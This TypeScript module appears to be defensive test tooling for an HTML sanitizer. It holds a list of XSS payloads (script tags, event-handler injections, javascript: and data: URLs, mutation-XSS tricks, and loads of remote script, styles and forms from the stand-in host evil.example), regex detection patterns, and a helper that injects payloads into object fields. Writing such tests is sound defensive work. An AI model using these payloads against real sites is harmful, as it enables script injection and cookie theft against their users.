import { Parser } from "htmlparser2";

/**
 * Payloads that must never survive as live markup in rich text, JSON-LD,
 * PDF documents or e-mail. Each one targets a different parser quirk.
 */
export const XSS_PAYLOADS: string[] = [
  `<script>alert(1)</script>`,
  `<SCRIPT SRC=//evil.example/x.js></SCRIPT>`,
  `<img src=x onerror=alert(1)>`,
  `<img src="x" onerror="alert(document.cookie)">`,
  `"><script>alert(1)</script>`,
  `'><img src=x onerror=alert(1)>`,
  `<svg onload=alert(1)>`,
  `<svg><script>alert(1)</script></svg>`,
  `<iframe src="javascript:alert(1)"></iframe>`,
  `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
  `<object data="javascript:alert(1)"></object>`,
  `<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">`,
  `<a href="javascript:alert(1)">click</a>`,
  `<a href="JaVaScRiPt:alert(1)">click</a>`,
  `<a href="java&#x09;script:alert(1)">click</a>`,
  `<a href="&#106;avascript:alert(1)">click</a>`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`,
  `<a href="//evil.example/phish">click</a>`,
  `<a href=x onmouseover=alert(1)>hover</a>`,
  `<p style="background:url(javascript:alert(1))">x</p>`,
  `<p style="width:expression(alert(1))">x</p>`,
  `<div style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</div>`,
  `<style>@import 'https://evil.example/x.css';</style>`,
  `<link rel=stylesheet href=//evil.example/x.css>`,
  `<meta http-equiv="refresh" content="0;url=//evil.example">`,
  `<base href="//evil.example/">`,
  `<form action="//evil.example"><input name=x></form>`,
  `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
  `<body onload=alert(1)>`,
  `<details open ontoggle=alert(1)>`,
  `<video><source onerror=alert(1)></video>`,
  `</script><script>alert(1)</script>`,
  `<!--<img src="--><img src=x onerror=alert(1)//">`,
];

/** Markup fragments that indicate an active payload survived in HTML output. */
export const LIVE_MARKUP_PATTERNS: RegExp[] = [
  /<script/i,
  /<iframe/i,
  /<object/i,
  /<embed/i,
  /<svg/i,
  /<img[^>]+onerror/i,
  /<img\s+src=x/i,
  /\son\w+\s*=\s*["']?[^"'\s>]*alert/i,
  /javascript:/i,
  /<style/i,
  /<link\b/i,
  /<meta\b/i,
  /<base\b/i,
  /<form\b/i,
];

const ACTIVE_ELEMENTS = new Set(["script", "iframe", "frame", "object", "embed", "applet"]);
const URL_ATTRIBUTES = new Set(["href", "src", "action", "formaction", "data", "srcdoc", "xlink:href"]);

/**
 * What a browser would treat as executable in `html`: script-like elements,
 * `on*` handler attributes and `javascript:` URLs. Parses the markup instead
 * of pattern-matching it, so escaped text that merely *looks* like a payload
 * (inside an attribute value or between tags) is not reported.
 */
export function findActiveContent(html: string): string[] {
  const found: string[] = [];
  const parser = new Parser({
    onopentag(name, attributes) {
      if (ACTIVE_ELEMENTS.has(name.toLowerCase())) found.push(`<${name}>`);
      for (const [attribute, value] of Object.entries(attributes)) {
        const lower = attribute.toLowerCase();
        if (lower.startsWith("on")) found.push(`${name} ${attribute}=`);
        // Browsers ignore tabs, newlines and spaces inside the scheme.
        if (URL_ATTRIBUTES.has(lower) && /^\s*javascript:/i.test(value.replace(/[\t\r\n]/g, ""))) found.push(`${name} ${attribute}=javascript:`);
      }
    },
  });
  parser.write(html);
  parser.end();
  return found;
}

/** Deep copy of `value` in which every string leaf accepted by `shouldPoison` is replaced by `payload`. */
export function poison<T>(value: T, payload: string, shouldPoison: (key: string) => boolean, key = ""): T {
  if (typeof value === "string") return (shouldPoison(key) ? payload : value) as T;
  if (Array.isArray(value)) return value.map((item) => poison(item, payload, shouldPoison, key)) as T;
  if (value && typeof value === "object" && !(value instanceof Buffer)) {
    return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, poison(v, payload, shouldPoison, k)])) as T;
  }
  return value;
}

/** Fields that hold server-built URLs, data URLs or asset references rather than user text. */
export const isServerBuiltField = (key: string) => /(url|font|href|path)$/i.test(key);
